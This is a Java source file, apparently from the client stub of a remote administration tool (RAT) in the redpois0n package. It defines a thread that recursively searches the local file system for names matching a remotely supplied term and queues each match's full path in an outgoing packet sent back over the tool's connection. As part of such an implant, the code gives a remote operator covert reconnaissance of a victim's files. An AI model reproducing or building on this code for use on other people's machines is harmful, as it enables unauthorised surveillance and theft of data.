package com.redpois0n.stub;

import java.io.File;

import com.redpois0n.stub.packets.outgoing.Packet37SearchResult;

public class FileSearch extends Thread {

	public static boolean running;

	private String start;
	private String name;
	private boolean dir;

	public FileSearch(String start, String name, boolean dir) {
		this.start = start;
		this.name = name;
		this.dir = dir;
	}

	public void run() {
		running = true;
		try {
			search(start.equals(File.separator) || start.toLowerCase().startsWith("%root%") ? File.listRoots()[0].getAbsolutePath() : start);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void search(String parentDirectory) throws Exception {
		File[] filesInDirectory = new File(parentDirectory).listFiles();
		
		if (filesInDirectory != null) {
			for (File f : filesInDirectory) {
				if (!running) {
					return;
				}
				if (f.isDirectory()) {
					search(f.getAbsolutePath());
				}
				if (dir && f.getAbsolutePath().replace(f.getName(), "").toLowerCase().contains(name.toLowerCase()) || f.getName().toLowerCase().contains(name.toLowerCase())) {
					Connection.addToSendQueue(new Packet37SearchResult(f.getAbsolutePath(), f.getName(), f.isDirectory()));
				}
			}
		}

	}

}
